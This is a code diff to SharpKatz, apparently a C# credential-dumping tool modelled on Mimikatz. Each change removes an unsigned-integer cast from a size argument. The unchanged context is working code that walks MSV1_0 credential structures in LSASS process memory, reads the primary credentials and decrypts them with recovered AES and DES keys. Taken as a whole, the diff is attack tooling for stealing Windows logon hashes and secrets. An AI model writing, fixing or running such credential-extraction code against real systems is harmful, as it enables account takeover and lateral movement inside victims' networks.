@@ -255,7 +255,7 @@ namespace SharpKatz.Module
 
                     while (lsasscred != IntPtr.Zero)
                     {
-                        byte[] credentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_MSV1_0_CREDENTIALS))));
+                        byte[] credentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Marshal.SizeOf(typeof(KIWI_MSV1_0_CREDENTIALS)));
                         
                         IntPtr pPrimaryCredentials = new IntPtr(BitConverter.ToInt64(credentialsBytes, Utility.FieldOffset<KIWI_MSV1_0_CREDENTIALS>("PrimaryCredentials")));
                         IntPtr pNext = new IntPtr(BitConverter.ToInt64(credentialsBytes, Utility.FieldOffset<KIWI_MSV1_0_CREDENTIALS>("next")));
@@ -263,7 +263,7 @@ namespace SharpKatz.Module
                         lsasscred = pPrimaryCredentials;
                         while (lsasscred != IntPtr.Zero)
                         {
-                            byte[] primaryCredentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS))));
+                            byte[] primaryCredentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Marshal.SizeOf(typeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS)));
                             primaryCredentials = Utility.ReadStruct<KIWI_MSV1_0_PRIMARY_CREDENTIALS>(primaryCredentialsBytes);
                             primaryCredentials.Credentials = Utility.ExtractUnicodeString(hLsass, IntPtr.Add(lsasscred, oshelper.MSV1CredentialsOffset));
                             primaryCredentials.Primary = Utility.ExtractUnicodeString(hLsass, IntPtr.Add(lsasscred, oshelper.MSV1PrimaryOffset));
@@ -271,7 +271,7 @@ namespace SharpKatz.Module
                             if (Utility.ExtractANSIStringString(hLsass, primaryCredentials.Primary).Equals("Primary"))
                             {
 
-                                byte[] msvCredentialsBytes = Utility.ReadFromLsass(ref hLsass, primaryCredentials.Credentials.Buffer, (ulong)primaryCredentials.Credentials.MaximumLength);
+                                byte[] msvCredentialsBytes = Utility.ReadFromLsass(ref hLsass, primaryCredentials.Credentials.Buffer, primaryCredentials.Credentials.MaximumLength);
 
                                 byte[] msvDecryptedCredentialsBytes = BCrypt.DecryptCredentials(msvCredentialsBytes, iv, aeskey, deskey);
 
@@ -325,7 +325,7 @@ namespace SharpKatz.Module
 
                         while (lsasscred != IntPtr.Zero)
                         {
-                            byte[] credentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_MSV1_0_CREDENTIALS))));
+                            byte[] credentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Marshal.SizeOf(typeof(KIWI_MSV1_0_CREDENTIALS)));
 
                             IntPtr pPrimaryCredentials = new IntPtr(BitConverter.ToInt64(credentialsBytes, Utility.FieldOffset<KIWI_MSV1_0_CREDENTIALS>("PrimaryCredentials")));
                             IntPtr pNext = new IntPtr(BitConverter.ToInt64(credentialsBytes, Utility.FieldOffset<KIWI_MSV1_0_CREDENTIALS>("next")));
@@ -333,7 +333,7 @@ namespace SharpKatz.Module
                             lsasscred = pPrimaryCredentials;
                             while (lsasscred != IntPtr.Zero)
                             {
-                                byte[] primaryCredentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS))));
+                                byte[] primaryCredentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Marshal.SizeOf(typeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS)));
                                 primaryCredentials = Utility.ReadStruct<KIWI_MSV1_0_PRIMARY_CREDENTIALS>(primaryCredentialsBytes);
                                 primaryCredentials.Credentials = Utility.ExtractUnicodeString(hLsass, IntPtr.Add(lsasscred, oshelper.MSV1CredentialsOffset));
                                 primaryCredentials.Primary = Utility.ExtractUnicodeString(hLsass, IntPtr.Add(lsasscred, oshelper.MSV1PrimaryOffset));
@@ -341,7 +341,7 @@ namespace SharpKatz.Module
                                 if (Utility.ExtractANSIStringString(hLsass, primaryCredentials.Primary).Equals("Primary"))
                                 {
 
-                                    byte[] msvCredentialsBytes = Utility.ReadFromLsass(ref hLsass, primaryCredentials.Credentials.Buffer, (ulong)primaryCredentials.Credentials.MaximumLength);
+                                    byte[] msvCredentialsBytes = Utility.ReadFromLsass(ref hLsass, primaryCredentials.Credentials.Buffer, primaryCredentials.Credentials.MaximumLength);
 
                                     byte[] msvDecryptedCredentialsBytes = BCrypt.DecryptCredentials(msvCredentialsBytes, iv, aeskey, deskey);
 
